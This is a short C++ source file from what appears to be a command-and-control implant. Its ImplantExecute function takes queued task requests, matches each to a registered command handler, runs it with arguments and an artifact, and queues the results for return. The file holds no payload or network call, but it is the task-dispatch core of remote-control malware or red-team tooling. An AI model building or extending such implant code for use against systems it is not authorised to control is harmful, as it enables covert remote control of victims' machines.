#include "Command.h"
#include "Implant.h"

BOOL ImplantExecute( DWORD Count ) {
    PLIST_ENTRY Entry        = NULL;
    PTASK_INFO  TaskInfo     = NULL;
    json        TaskArgs     = json::array();
    string      TaskArtifact = string();
    json        TaskResult   = json::object();
    json        TaskRequest  = json::array();

    while (!IsListEmpty( &g_Implant.TaskRequestList ) && Count--) {
        Entry       = RemoveHeadList( &g_Implant.TaskRequestList );
        TaskInfo    = CONTAINING_RECORD( Entry, TASK_INFO, ListEntry );
        TaskRequest = TaskInfo->Data;
        for (const auto& Handler : g_CommandRegistry) {

            if (Handler.Name == TaskRequest["name"]) {

                // Optional
                TaskArgs     = TaskRequest["args"].is_null() ? json::array() : TaskRequest["args"];
                TaskArtifact = TaskRequest["artifact"].is_null()
                                   ? ""
                                   : TaskRequest["artifact"].get<std::string>();

                if (!Handler.Invoke( TaskArgs, TaskArtifact, TaskResult )) {
                    printf( "[-] Failed to execute task: %s\n", Handler.Name.c_str() );
                    break;
                }

                ImplantQueueTaskResult( TaskResult );

                break;
            }
        }
    }

    return TRUE;
}
